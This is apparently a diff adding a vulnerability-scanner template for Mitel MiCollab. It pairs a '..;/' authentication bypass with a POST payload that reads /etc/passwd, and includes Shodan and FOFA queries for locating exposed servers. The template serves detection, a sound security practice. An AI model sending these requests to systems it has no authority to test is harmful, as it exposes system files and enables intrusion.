@@ -1,0 +1,61 @@
+id: mitel-arbitary-file-read
+
+info:
+  name: Mitel - Arbitary File Read
+  author: DhiyaneshDk
+  severity: critical
+  description: |
+    This template checks for a directory traversal vulnerability in the NPM-PWG application by attempting to access sensitive directories.
+  remediation: |
+    Ensure that the application properly validates and sanitizes user input to prevent directory traversal attacks. Use a whitelist approach for allowed directories and employ proper access controls.
+  reference:
+    - https://github.com/watchtowrlabs/Mitel-MiCollab-Auth-Bypass_CVE-2024-41713?ref=labs.watchtowr.com
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: mitel
+    product: cmg_suite
+    shodan-query:
+      - http.html:"Mitel Networks"
+      - http.html:"mitel networks"
+    fofa-query: body="mitel networks"
+  tags: mitel,lfi
+
+http:
+  - raw:
+      - |
+        GET /npm-pwg/..;/usp/searchUsers.do HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "users"
+          - "Network Element"
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /npm-pwg/..;/ReconcileWizard/reconcilewizard/sc/IDACall?isc_rpc=1&isc_v=&isc_tnum=2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _transaction=%3Ctransaction+xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2F10%2FXMLSchema-instance%22+xsi%3Atype%3D%22xsd%3AObject%22%3E%3CtransactionNum+xsi%3Atype%3D%22xsd%3Along%22%3E2%3C%2FtransactionNum%3E%3Coperations+xsi%3Atype%3D%22xsd%3AList%22%3E%3Celem+xsi%3Atype%3D%22xsd%3AObject%22%3E%3Ccriteria+xsi%3Atype%3D%22xsd%3AObject%22%3E%3CreportName%3E..%2F..%2F..%2Fetc%2Fpasswd%3C%2FreportName%3E%3C%2Fcriteria%3E%3CoperationConfig+xsi%3Atype%3D%22xsd%3AObject%22%3E%3CdataSource%3Esummary_reports%3C%2FdataSource%3E%3CoperationType%3Efetch%3C%2FoperationType%3E%3C%2FoperationConfig%3E%3CappID%3EbuiltinApplication%3C%2FappID%3E%3Coperation%3EdownloadReport%3C%2Foperation%3E%3ColdValues+xsi%3Atype%3D%22xsd%3AObject%22%3E%3CreportName%3Ex.txt%3C%2FreportName%3E%3C%2FoldValues%3E%3C%2Felem%3E%3C%2Foperations%3E%3Cjscallback%3Ex%3C%2Fjscallback%3E%3C%2Ftransaction%3E&protocolVersion=1.0&__iframeTarget__=x
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: word
+        part: content_type
+        words:
+          - "application/javascript"
+
+      - type: status
+        status:
+          - 200
